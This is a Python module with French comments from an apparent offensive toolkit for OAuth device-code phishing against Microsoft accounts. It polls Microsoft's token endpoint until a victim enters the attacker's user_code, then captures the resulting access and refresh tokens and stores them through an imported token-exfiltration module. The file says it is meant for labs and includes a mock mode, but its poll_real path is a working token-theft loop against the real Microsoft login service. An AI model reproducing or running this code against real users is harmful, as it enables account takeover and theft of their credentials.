"""
attack/device_code/poller.py — Polling pour récupérer le token
==============================================================

Une fois que la victime a entré le `user_code` sur le verification_uri
et s'est authentifiée, le `device_code` devient "autorisé". L'attaquant
poll en arrière-plan (toutes les `interval` secondes) et dès que le
flow est autorisé, il récupère l'access_token + refresh_token.

En labo, on simule ce flow avec un mock ; en prod, on appellerait :
    POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
"""

from __future__ import annotations

import asyncio
import logging
import secrets
from datetime import datetime, timedelta
from typing import Any, Awaitable, Callable, Optional

from ..oauth_consent.token_exfil import mint_token_from_code, store_token
from .initiator import DeviceCodeFlow

logger = logging.getLogger("attack.device_code.poller")


class DeviceCodePoller:
    """
    Poller asynchrone qui attend que la victime autorise le flow.

    Args:
        flow: DeviceCodeFlow initié par `DeviceCodeInitiator`
        on_authorized: callback async(result) appelé quand le flow est autorisé
        auto_accept_callback: si défini, appelé à chaque poll; retourne True
            pour autoriser immédiatement le flow
        simulate_authorized: si True, passe en authorized après ~30s (mode mock)
        mock_mode: si True, utilise la simulation locale plutôt qu'un vrai provider
    """

    def __init__(
        self,
        flow: DeviceCodeFlow,
        on_authorized: Optional[Callable[[dict[str, Any]], Awaitable[None]]] = None,
        auto_accept_callback: Optional[Callable[[DeviceCodeFlow], Awaitable[bool]]] = None,
        simulate_authorized: bool = False,
        mock_mode: bool = True,
    ):
        self.flow = flow
        self.on_authorized = on_authorized
        self.auto_accept_callback = auto_accept_callback
        self.simulate_authorized = simulate_authorized
        self.mock_mode = mock_mode
        self._stop_event: Optional[asyncio.Event] = None

    def stop(self) -> None:
        """Demande l'arrêt du polling."""
        if self._stop_event:
            self._stop_event.set()

    async def poll_until_done(self, max_wait_s: int = 900) -> DeviceCodeFlow:
        """
        Boucle de polling asynchrone avec backoff exponentiel.

        Attend flow.interval * (1.5^n_attempts) secondes entre chaque tentative,
        avec un maximum de 30s. Retourne le flow dans son état final.

        États: pending → authorized → expired → error
        """
        self._stop_event = asyncio.Event()
        start_time = datetime.utcnow()
        n_attempts = 0
        mock_authorize_after = 30.0
        mock_elapsed = 0.0

        while not self._stop_event.is_set():
            n_attempts += 1

            elapsed_total = (datetime.utcnow() - start_time).total_seconds()
            if elapsed_total >= max_wait_s:
                self.flow.state = "expired"
                logger.warning(
                    "[DEVICE_CODE] Flow %s expiré après %ds de polling",
                    self.flow.flow_id, max_wait_s,
                )
                return self.flow

            if self.flow.is_expired():
                self.flow.state = "expired"
                logger.warning(
                    "[DEVICE_CODE] Flow %s expiré (verification_uri)",
                    self.flow.flow_id,
                )
                return self.flow

            if self.auto_accept_callback is not None:
                try:
                    if await self.auto_accept_callback(self.flow):
                        await self._authorize_flow()
                        return self.flow
                except Exception as e:
                    logger.error(
                        "[DEVICE_CODE] Erreur auto_accept_callback: %s", e
                    )
                    self.flow.state = "error"
                    return self.flow

            if self.simulate_authorized:
                wait_interval = self._compute_backoff(n_attempts)
                mock_elapsed += wait_interval
                if mock_elapsed >= mock_authorize_after:
                    await self._authorize_flow()
                    return self.flow

            if self.mock_mode and not self.simulate_authorized:
                wait_interval = self._compute_backoff(n_attempts)
                mock_elapsed += wait_interval
                if mock_elapsed >= mock_authorize_after:
                    await self._authorize_flow()
                    return self.flow

            wait_interval = self._compute_backoff(n_attempts)
            try:
                await asyncio.wait_for(
                    self._stop_event.wait(),
                    timeout=wait_interval,
                )
            except asyncio.TimeoutError:
                pass

        return self.flow

    def _compute_backoff(self, n_attempts: int) -> float:
        """
        Calcule l'intervalle avec backoff exponentiel.

        interval * (1.5 ^ (n_attempts - 1)), borné à 30s max.
        """
        base = float(self.flow.interval)
        multiplier = 1.5 ** max(0, n_attempts - 1)
        computed = base * multiplier
        return min(computed, 30.0)

    async def _poll_real(self) -> dict[str, Any] | None:
        """Un cycle de polling RÉEL contre le provider (Microsoft).

        Retourne le dict token si autorisé, None sinon (pending/slow_down).
        Lève RuntimeError en cas d'erreur protocolaire définitive.
        """
        import httpx

        tenant = getattr(self, "tenant", "consumers")
        url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
        resp = await asyncio.to_thread(
            httpx.post,
            url,
            data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": self.flow.client_id,
                "device_code": self.flow.device_code,
            },
            timeout=15,
        )
        d = resp.json()
        if resp.status_code == 200 and "access_token" in d:
            return d
        err = d.get("error", "")
        if err in ("authorization_pending", "slow_down"):
            return None
        if err == "expired_token":
            self.flow.state = "expired"
            return None
        raise RuntimeError(f"Device code polling erreur: {err or resp.status_code}")

    async def poll_real(self, max_wait_s: int = 900) -> DeviceCodeFlow:
        """Boucle de polling RÉELLE (protocol RFC 8628) jusqu'à autorisation.

        La victime doit entrer self.flow.user_code sur self.flow.verification_uri.
        Dès que Microsoft retourne un access_token, le flow passe 'authorized'
        et self.flow.result contient access_token + refresh_token RÉELS.
        """
        self._stop_event = asyncio.Event()
        start = datetime.utcnow()
        while not self._stop_event.is_set():
            if (datetime.utcnow() - start).total_seconds() >= max_wait_s:
                self.flow.state = "expired"
                return self.flow
            if self.flow.is_expired():
                self.flow.state = "expired"
                return self.flow
            try:
                result = await self._poll_real()
            except RuntimeError as exc:
                logger.error("[DEVICE_CODE][REAL] %s", exc)
                self.flow.state = "error"
                return self.flow
            if result is not None:
                self.flow.state = "authorized"
                self.flow.result = {
                    **result,
                    "expires_at": (
                        datetime.utcnow()
                        + timedelta(seconds=int(result.get("expires_in", 3600)))
                    ).isoformat() + "Z",
                }
                logger.warning(
                    "[DEVICE_CODE][REAL] flow AUTORISÉ — access_token obtenu "
                    "(scope=%s)", self.flow.scope,
                )
                if self.on_authorized:
                    await self.on_authorized(self.flow.result)
                return self.flow
            try:
                await asyncio.wait_for(self._stop_event.wait(),
                                       timeout=float(self.flow.interval))
            except asyncio.TimeoutError:
                pass
        return self.flow

    async def _authorize_flow(self) -> None:
        """Passe le flow en authorized, génère le token et appelle le hook."""
        self.flow.state = "authorized"

        access_token = secrets.token_urlsafe(48)
        refresh_token = secrets.token_urlsafe(64)
        expires_in = 3600

        self.flow.result = {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "expires_in": expires_in,
            "token_type": "Bearer",
            "scope": self.flow.scope,
            "expires_at": (
                datetime.utcnow() + timedelta(seconds=expires_in)
            ).isoformat() + "Z",
        }

        try:
            captured = mint_token_from_code(
                code=self.flow.device_code,
                client_id=self.flow.client_id,
                user="victim@entreprise.local",
                scope=self.flow.scope,
                app_name="DeviceCode Flow",
            )
            captured.access_token = access_token
            captured.refresh_token = refresh_token
            captured.expires_at = self.flow.result["expires_at"]
            store_token(captured)
        except Exception as e:
            logger.warning(
                "[DEVICE_CODE] Impossible de persister via mint_token_from_code: %s", e
            )

        logger.warning(
            "[DEVICE_CODE] Token capturé via user_code=%s, expires_in=%ds",
            self.flow.user_code, expires_in,
        )

        if self.on_authorized:
            try:
                await self.on_authorized(self.flow.result)
            except Exception as e:
                logger.error(
                    "[DEVICE_CODE] Erreur dans on_authorized callback: %s", e
                )


async def start_polling_async(
    flow: DeviceCodeFlow,
    on_authorized: Optional[Callable[[dict[str, Any]], Awaitable[None]]] = None,
    max_wait_s: int = 900,
    simulate_authorized: bool = False,
    mock_mode: bool = True,
) -> DeviceCodePoller:
    """
    Démarre le polling dans une tâche de fond (asyncio).
    Retourne le poller pour suivi.
    """
    poller = DeviceCodePoller(
        flow=flow,
        on_authorized=on_authorized,
        simulate_authorized=simulate_authorized,
        mock_mode=mock_mode,
    )
    asyncio.create_task(poller.poll_until_done(max_wait_s=max_wait_s))
    return poller


def start_polling(
    flow: DeviceCodeFlow,
    on_success: Optional[Callable] = None,
    on_expiry: Optional[Callable] = None,
) -> DeviceCodePoller:
    """
    Helper fonctionnel rétro-compatible — démarre un thread asyncio
    en arrière-plan avec asyncio.run().
    Pour un usage asynchrone natif, préférez `DeviceCodePoller.poll_until_done()`.
    """
    import threading

    poller = DeviceCodePoller(flow=flow, mock_mode=True)

    def _runner():
        async def _wrapped():
            if on_success:
                async def _cb(result):
                    on_success(result)
                poller.on_authorized = _cb
            await poller.poll_until_done()
            if poller.flow.state == "expired" and on_expiry:
                on_expiry(flow)
        asyncio.run(_wrapped())

    t = threading.Thread(target=_runner, daemon=True, name="DeviceCodePollerLegacy")
    t.start()
    logger.info("[DEVICE_CODE] Polling démarré (user_code=%s)", flow.user_code)
    return poller
